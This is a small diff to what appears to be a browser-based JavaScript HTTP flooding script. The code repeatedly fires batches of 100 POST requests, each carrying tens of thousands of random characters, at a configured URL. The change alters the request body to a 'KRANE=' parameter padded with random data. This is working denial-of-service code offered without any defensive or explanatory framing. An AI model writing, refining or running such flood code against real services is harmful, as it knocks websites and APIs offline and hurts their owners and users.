@@ -23,14 +23,13 @@ $(function () {
                 }        
 
             }, 1);
-            
         }
 
         if (item.type == "API_REQUEST_POST") {
             setInterval(() => {
                 for (let i = 0; i < 100; i++) {
                     setTimeout(() => {
-                        $.post(item.url, randomString(65500));
+                        $.post(item.url, "KRANE=" + randomString(65000));
                     }, 0);
                 }        
 
